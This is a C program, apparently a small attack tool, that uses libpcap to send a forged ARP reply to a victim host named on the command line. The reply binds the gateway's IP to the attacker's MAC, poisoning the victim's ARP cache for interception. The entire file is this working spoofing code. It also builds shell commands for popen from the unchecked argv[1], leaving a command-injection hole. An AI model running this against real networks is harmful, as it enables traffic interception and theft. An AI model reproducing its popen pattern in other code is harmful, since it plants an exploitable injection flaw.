#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netinet/ether.h>

int main(int argc, char *argv[])
{
	pcap_t *handle;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	// Find the properties for the device 
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	// Open the session in promiscuous mode
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	FILE* fp;
	char kern[100] = {0x0}, buf[20] = {0x0};
	char buf3[30] = "44:1C:A8:E3:AA:DF";
	struct in_addr vict_ip, gate_ip;
	struct ether_addr atkr_mac, vict_mac;

	// Attacker MAC address
	sprintf(kern, "ifconfig | grep '%s' | awk '{print $5}'", dev);
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	ether_aton_r(buf, &atkr_mac);

	// Gateway IP address
	sprintf(kern, "netstat -r | grep 'default' | awk '{print $2}'");
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	inet_aton(buf, &gate_ip);

	// Victim IP
	inet_aton(argv[1], &vict_ip);

	// Victim MAC address
	sprintf(kern, "ping %s", argv[1]);
	fp = popen(kern, "r");
	pclose(fp);
	sprintf(kern, "arp -a | grep '%s' | awk '{print $4}'", argv[1]);
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	ether_aton_r(buf, &vict_mac);

	u_char packet[100];
	int length;
	struct ether_header eth_hdr;
	struct ether_arp arp_hdr;

	// Ethernet header
	memcpy(eth_hdr.ether_shost, &atkr_mac.ether_addr_octet, 6);
	memcpy(eth_hdr.ether_dhost, &vict_mac.ether_addr_octet, 6);
	eth_hdr.ether_type = htons(ETHERTYPE_ARP);

	// ARP header
	arp_hdr.ea_hdr.ar_hrd = htons(1);
	arp_hdr.ea_hdr.ar_pro = htons(2048);
	arp_hdr.ea_hdr.ar_hln = 6;
	arp_hdr.ea_hdr.ar_pln = 4;
	arp_hdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
	memcpy(&arp_hdr.arp_sha, &atkr_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_spa, &gate_ip.s_addr, 4);
	memcpy(&arp_hdr.arp_tha, &vict_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_tpa, &vict_ip.s_addr, 4);

	// Packet send
	memcpy(packet, &eth_hdr, 14);
	memcpy(packet + 14, &arp_hdr, sizeof(struct ether_arp));
	length = 14 + sizeof(struct ether_arp);
	if(length < 64)
	{
		for(int i = length; i < 64; i++)
			packet[i] = 0;
	}
	if(pcap_sendpacket(handle, packet, length) != 0)
	{
		fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
		return -1;
	}

	return(0);
}
